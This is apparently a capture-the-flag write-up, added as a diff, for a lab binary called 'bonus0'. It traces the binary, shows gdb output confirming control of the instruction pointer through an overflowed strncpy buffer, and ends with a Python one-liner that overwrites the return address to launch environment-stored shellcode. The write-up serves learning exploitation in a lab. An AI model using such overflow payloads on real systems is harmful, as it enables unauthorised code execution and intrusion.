@@ -1,0 +1,38 @@
+1st we start by ltracing our program:
+
+we find that there is 1puts, 1 read of 4096, 1 strchr, 1strncpy of 20 bytes
+repeated 2 times we find that this is a function called p()
+
+since the read is of 4096 and the strncpy is of size 20 we can smell something fishy around there so lets try to put more in both of the read buffer and see what happens :
+
+./bonus0
+ - 
+AAAABBBBCCCCDDDDEEEEFFFF
+ - 
+000011112222333344445555
+!!! Seg Fault !!!
+
+good now lets try that again with gdb.
+Starting program: /home/user/bonus0/bonus0
+  -
+ AAAABBBBBDDDDEEEEFFFF
+  -
+  0000111112222333344445555
+
+  Breakpoint 1, 0x08048598 in pp ()
+  (gdb) c
+  Continuing.
+  AAAABBBBBDDDDEEEEFFF00001111122223333444�� 00001111122223333444��
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x32323232 in ?? ()
+
+nice it seems that we have the control of EIP in 0x32323232 it means where all the "2222" are in the 2nd buffer
+the next move is pretty straighforward :
+	-Export a SHELLCODE into the env
+	-Write a C program to find the address of our env Variable
+	-Launch Our Payload
+
+I had trouble to keep my shell open so i decided to use cat <() - | to keep it open:
+
+cat <(python -c 'print "W" * 20 + "\n" + "A" * (4096 - 20) + "AAAABBBB" + "\xbf\xff\xf8\xe6"[::-1] + "DDDDEEEEFFFF" + "\n"') - | ./bonus0
